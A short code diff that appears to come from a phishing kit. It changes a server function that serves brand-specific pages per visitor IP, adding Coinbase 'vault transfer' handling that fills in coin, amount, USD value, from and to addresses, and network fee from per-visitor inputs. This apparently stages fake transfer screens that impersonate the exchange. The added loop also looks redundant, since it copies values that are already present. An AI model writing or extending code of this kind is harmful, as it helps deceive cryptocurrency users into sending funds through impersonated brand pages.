@@ -4,6 +4,7 @@ import {
 	pageVarSettingKey,
 	resolveDisplayVars,
 	getSchema,
+	VAULT_TRANSFER_PAGES,
 	type PageVarField
 } from '$lib/pageVars.js';
 import { buildLiveDateVars } from '$lib/dateVars.js';
@@ -59,7 +60,14 @@ export function resolvePageVarsForIp(
 	if (ip) {
 		const visitor = serverState.visitors.get(ip);
 		if (visitor?.inputs && Object.keys(visitor.inputs).length > 0) {
-			return resolvePageVars(brand, page, visitor.inputs);
+			const inputs = { ...visitor.inputs };
+			if (brand === 'Coinbase' && VAULT_TRANSFER_PAGES.has(page)) {
+				const shared = ['coin', 'amount', 'amountUsd', 'from', 'to', 'networkFee'];
+				for (const key of shared) {
+					if (visitor.inputs[key]) inputs[key] = visitor.inputs[key];
+				}
+			}
+			return resolvePageVars(brand, page, inputs);
 		}
 	}
 	return resolvePageVars(brand, page);
